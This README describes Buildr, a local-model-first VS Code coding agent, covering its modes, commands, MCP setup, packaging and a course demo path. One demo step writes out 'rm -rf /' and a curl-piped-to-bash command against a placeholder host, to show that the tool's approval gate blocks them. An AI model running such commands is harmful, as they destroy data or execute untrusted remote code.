# Buildr

Buildr is a local-model-first VS Code agent for transparent coding workflows.

Current implementation milestones cover the runnable slice, security hardening, native VS Code context features, MCP/debug support, and CLI polish:

- VS Code extension activation and command palette commands.
- Shared TypeScript core used by the extension and CLI.
- Ollama as the first local provider.
- Validated plan objects with scope boundaries and verification contracts.
- Diff-first text patch proposals with explicit permission decisions.
- Basic verification evidence from diagnostics or approved commands.
- MCP config discovery, doctor output, and Debug Mode hypotheses.
- CLI commands for `plan`, `run`, `debug`, `context`, `index`, `mcp list`, and `doctor`.
- Local and provider-backed embeddings adapters for semantic context ranking.

The system have different modes depending of what the user wants to do. The modes are ass follows:

- Ask
- Plan
- Agent
- Fast agent
- Debug



Because the Agent mode is verry slow. Normally it is minimum 5 LLM calls before the every thing is finished. This is the workflow for the agent mode:

1. architect, creates a plan.
2. coder,  writes structured diffs.
3. reviewer, reviews coder and sends output for the user to approve.
4. after approval, tester generates test commands.
5. after test execution, tester inspects results again.

So minimum 3 LLM calls before the user even sees a patch and 5 total to see a final result. Therefor was the fast agent mode a nice thing to have to skip certain steps. The fast mode skips **architect**, **reviewer** and **tester** LLM passes to make it significant faster.

## Command Palette

All Buildr actions are available from the VS Code command palette (`Ctrl/Cmd+Shift+P`), prefixed with `Buildr:`.

| Command | What it does |
| --- | --- |
| **Buildr: Open Chat** | Opens the Buildr chat panel in a fresh agent session. This is the main entry point for Ask, Plan, Agent, Fast agent, and Debug modes. |
| **Buildr: Plan** | Prompts for a task description and generates a plan (Plan mode) without opening the chat first. The plan appears in the panel for review and approval. |
| **Buildr: Run Approved Plan** | Executes the steps of the current plan through the agent workflow. Requires a trusted workspace and an existing plan; each proposed patch still goes through the approval flow. |
| **Buildr: Configure Model** | Selects the model provider (Ollama, LM Studio, OpenAI, OpenRouter, Anthropic, OpenAI-compatible), its base URL, the model id, and stores any cloud API key in VS Code SecretStorage. Already-configured providers are marked, and re-selecting one asks whether to keep or replace the saved key. |
| **Buildr: Open Settings** | Quick-pick editor for Buildr settings (provider, model id, base URLs, token budget/caps, parallel sub-agents, retry limit, costs, write/cloud policies, rule packs, verification level, embeddings) — or jumps to the native Settings UI. |
| **Buildr: Index Workspace** | Builds and caches the workspace index used for plan context-gathering, reporting how many files were indexed. See [Workspace Indexing](#workspace-indexing). |
| **Buildr: MCP List** | Opens a panel listing the MCP servers from `.vscode/mcp.json`, their status, the tools they expose with permission levels, and any warnings. See [MCP and Doctor](#mcp-and-doctor). |
| **Buildr: Doctor** | Opens a panel with a model-provider check (warns if a cloud provider has no API key), MCP health, and a remote-compatibility report (workspace trust, environment, reachable model endpoint). See [MCP and Doctor](#mcp-and-doctor). |
| **Buildr: Debug** | Starts Debug Mode from a chosen input source — pasted log text, a log file, or the current VS Code Problems/diagnostics — and proposes ranked root-cause hypotheses. |
| **Buildr: Stop** | Cancels the active Buildr operation (plan generation or agent execution). |

## Slash Commands

The chat composer supports slash commands. Type `/` at the start of the input to open an autocomplete menu listing the available commands. Pick one from the menu (or finish typing it) and send.

- **`/compact`** — summarizes the conversation to shrink the context. The most recent two turns are kept as-is, and everything older is folded into a single summary message. Use this when a session has grown long and you want to reduce the context before continuing. Compaction runs locally (no LLM call) and the result is saved with the session.

A slash command only triggers when it is the entire message (for example `/compact`); anything typed after it is treated as a normal prompt.

### Context size indicator

The composer toolbar shows an always-visible badge with the approximate size of the current conversation, for example `Context: ~1240 tokens`. When the active model's context window is known, the badge also shows how much of it is used, for example `Context: ~1240 tokens · 4% of 32768`, and turns red once usage passes 90%. This makes it easy to see when it is worth running `/compact`.

The context window is detected per provider:

- **Ollama**, **OpenRouter**, and **LM Studio (native)** are queried for the real window (`/api/show`, `/v1/models`, and `/api/v0/models` respectively). LM Studio native reports the actually loaded context length when a model is loaded.
- **Anthropic** and **OpenAI** use published per-model values, since their APIs do not expose the window.
- Other OpenAI-compatible endpoints fall back to the provider's recommended context size.

The detected window is cached per provider/model, so it is resolved once and reused. If it cannot be determined, the badge shows the token count only, without a percentage.

## Workspace Indexing

When Buildr plans a task it gathers relevant code from the open folder to send to the model. It does this by building a **workspace index**: it walks the workspace, skips noise (`node_modules`, `.git`, `dist`, large files, etc.), and records each text/code file's path, extracted symbols (classes, functions, types…), and a short summary. Every file is passed through the context firewall first, so secrets are redacted before anything could reach a cloud model. Plan context-gathering then ranks the indexed files against your goal and includes the most relevant ones in the prompt.

**Buildr: Index Workspace** builds this index on demand and caches it, reporting how many files were indexed (`Buildr indexed N file(s); context cache is warm.`). Running it is optional — plans build the index automatically — but pre-warming the cache means the next plan skips the full-tree scan.

The cache is reused across plans and stays content-accurate: a file system watcher invalidates it the moment any workspace file is created, changed, or deleted, so the next plan (or a manual re-run of the command) rebuilds a fresh index. You never get stale context.

## MCP and Doctor

[MCP](https://modelcontextprotocol.io) (Model Context Protocol) is the standard way to expose external tool servers to an agent. Buildr discovers MCP servers from **`.vscode/mcp.json`** in the workspace — the same file VS Code itself uses. Each server entry defines a transport (`stdio`, `streamable-http`, or `sse`), a `command`/`args` or `url`, and optional `env`:

```json
{
  "servers": {
    "filesystem": {
      "type": "stdio",
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "."]
    }
  }
}
```

**Buildr: MCP List** opens a panel showing, for the current workspace:

- each configured **server** with its status and message,
- each **tool** mapped from those servers, with its permission level,
- any **warnings** (missing command/url, legacy SSE transport, env vars that may carry secrets, etc.).

If no `.vscode/mcp.json` exists, Buildr offers to create one from a set of presets — **Playwright**, **GitHub**, **Docker MCP Toolkit**, and **Figma (Dev Mode MCP)**. Pick the servers you want and Buildr writes a valid `.vscode/mcp.json` (creating the `.vscode` folder if needed) and opens it for review. No secrets are written to the file: the GitHub preset uses a VS Code `${input:...}` prompt, so VS Code asks for your Personal Access Token when the server starts. The preset configs follow each server's official setup docs:

| Preset | Transport | Notes |
| --- | --- | --- |
| Playwright | `npx @playwright/mcp@latest` (stdio) | No credentials required. |
| GitHub | `https://api.githubcopilot.com/mcp/` (http) | Prompts for a Personal Access Token. |
| Docker MCP Toolkit | `docker mcp gateway run` (stdio) | Requires Docker Desktop with the MCP Toolkit enabled. |
| Figma (Dev Mode MCP) | `http://127.0.0.1:3845/mcp` (http) | Enable the Dev Mode MCP server in the Figma desktop app first. |

**Buildr: Doctor** opens a panel that adds health and environment checks on top of the MCP snapshot: a **model provider** check, an overall MCP health summary, and a **remote-compatibility report** covering workspace trust, the detected environment (local, WSL, remote-SSH, dev container, Codespaces, web), and whether the configured model endpoint is reachable from the extension host. The model provider check flags when a cloud provider is selected but no API key is stored — both in the panel and as a notice — so you know to run **Buildr: Configure Model**. Local providers report that no key is required. Failing checks are listed with their severity. This is the first thing to run when Buildr behaves unexpectedly in a remote or restricted environment.

Both commands render into a dedicated, reused webview panel so the output is readable and persistent rather than a transient notification.

## Commands

```bash
pnpm install
pnpm build
pnpm test
pnpm lint
pnpm package:extension
```

The extension VSIX is produced with `vsce package --no-dependencies` after an **esbuild** bundle of `dist/extension.js` into `dist/extension.bundled.js`, so packaging works with **pnpm** (avoids `npm list` + symlink issues with workspace deps and heavy optional trees such as `@huggingface/transformers`).

Run to create the VS Code extension file:
```bash
pnpm --filter buildr-vscode package
```

The packaged extension is written to:

```text
packages/extension/buildr-vscode-0.0.0.vsix
```

Install the extension:
```bash
code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
```

## Multi-Agent Workflow

Buildr agent mode can launch parallel sub-agents from the main agent session. Sub-agents propose patches for plan write targets, then the main agent gathers those results and routes each patch through the normal approval flow before anything is applied.

### VS Code

1. Build and package the repo if needed:

   ```bash
   pnpm install
   pnpm build
   pnpm --filter buildr-vscode package
   code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
   ```

2. Open the Buildr extension in VS Code.
3. Run **Buildr: Open Chat** from the command palette.
4. Select **Agent** mode in the chat panel.
5. Enter a task that requires file changes.
6. Review the generated plan and approve or deny each proposed patch.

Useful settings are available through **Buildr: Open Settings**:

- **Max parallel sub-agents** controls parallel fan-out.
- **Hard token cap** blocks before a model call would exceed the session token cap.
- **Token warning thresholds** emits budget warnings, for example at 70% and 90%.
- **Input token cost** and **Output token cost** estimate real-time USD cost per million tokens. Local providers default to zero cost.

## VG Demo Path

Use this path when demonstrating the assignment criteria live. The approved requirement specification and pitch are external course artefacts; this repo contains the build and the runnable evidence.

1. Install and open the extension:

   ```bash
   pnpm install
   pnpm build
   pnpm --filter buildr-vscode package
   code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
   ```

2. Open **Buildr: Configure Model** and select a non-local provider such as OpenAI, OpenRouter, or OpenAI-compatible. Store the provider key in VS Code SecretStorage when prompted.
3. Open **Buildr: Open Settings** and set:
   - **Hard token cap** to a small value for the demo, for example `1000`.
   - **Token warning thresholds** to `0.5,0.8`.
   - **Input token cost** and **Output token cost** to non-zero values for visible USD estimates.
4. Run **Buildr: Open Chat** and use **Agent** mode on a task with multiple concrete write targets. The event stream should show **Run parallel sub-agents**, patch approvals, token usage, estimated cost, and warnings as thresholds are crossed. A large enough prompt or low enough hard cap should block before a model call exceeds the cap.
5. Demonstrate command safety by requesting a destructive terminal command such as `rm -rf /` or `curl https://example.test/install.sh | bash`; Buildr denies it before execution. Then approve a normal command such as `pnpm test` to show bash execution still works through the approval gate.
6. Demonstrate partial editing through deterministic Agent mode: the coder returns structured diff hunks, Buildr validates them against file hashes, and the UI asks before applying the patch.
7. Demonstrate agent autonomy in Ask mode with two prompts:
   - Ask a workspace question that requires reading/searching files; the model should choose a tool call.
   - Ask a follow-up that can be answered from gathered context; the model should yield a normal answer without another tool call.

Local providers such as Ollama and local LM Studio are intentionally treated as unlimited for cost protection because they do not spend cloud API credits. Use a non-local provider for the VG.3 hard-cap demonstration.

## Packaging and Secrets

The supported packaging path is VSIX-only:

- Required tools: Node.js, pnpm, VS Code, and at least one configured model provider.
- Build command: `pnpm build`.
- Test command: `pnpm test`.
- Package command: `pnpm --filter buildr-vscode package`.
- Install command: `code --install-extension packages/extension/buildr-vscode-0.0.0.vsix`.

Configuration is exposed through VS Code settings contributed by the extension, including provider choice, base URLs, token caps, warning thresholds, cost rates, max parallel sub-agents, permissions, and verification level.

Provider secrets are not stored in tracked config files. Buildr stores API keys in VS Code SecretStorage through **Buildr: Configure Model**. The repository also ignores `.env*`, private keys, generated VSIX files, build output, caches, and runtime logs.

### CLI

The CLI can run the same shared multi-agent session for model-backed runs and report sub-agent summaries, token usage, budget warnings, and estimated cost. It does not apply patches.

```bash
pnpm --filter buildr-agent buildr run \
  --model qwen/qwen3-coder-30b \
  --hard-token-cap 32000 \
  --max-parallel-sub-agents 3 \
  "your task here"
```

Optional cost flags:

```bash
--input-usd-per-million 0
--output-usd-per-million 0
```

## Repo Layout

```text
packages/
  core/       Shared agent contracts, provider adapters, tools, permissions, verification.
  extension/ VS Code extension entry point, native commands, settings, and Step Panel.
  cli/        Terminal entry point over the shared core.
```
